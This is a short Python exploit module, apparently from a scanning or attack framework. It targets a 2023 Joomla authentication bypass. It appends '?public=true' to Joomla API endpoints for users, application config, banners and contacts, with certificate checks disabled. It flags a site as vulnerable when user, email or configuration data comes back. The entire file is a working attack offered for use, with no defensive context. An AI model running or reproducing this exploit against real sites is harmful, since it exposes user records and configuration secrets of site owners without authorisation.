import requests
from core.printmodels import *
import re

class Joomla_Bypass_2023:
    def __init__(self):
        self.name = "Joomla Authentication Bypass"
        self.description = "Joomla Authentication Bypass (2023)"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/x-www-form-urlencoded'
            }

            # Multiple bypass attempts
            payloads = [
                "/api/index.php/v1/users?public=true",
                "/api/index.php/v1/config/application?public=true",
                "/api/index.php/v1/banners?public=true",
                "/api/index.php/v1/contacts?public=true"
            ]

            for payload in payloads:
                target = f"{site}{payload}"
                response = requests.get(target, headers=headers, verify=False, timeout=10)
                
                if response.status_code == 200 and any(x in response.text for x in ['users', 'email', 'groups', 'params']):
                    data = response.json()
                    if isinstance(data, dict) and ('data' in data or 'error' not in data):
                        return PrintSuccess(f"[Joomla-2023] Vulnerable! Authentication bypass successful at {payload}")

            return PrintFailed("[Joomla-2023] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[Joomla-2023] Error: {str(e)}")
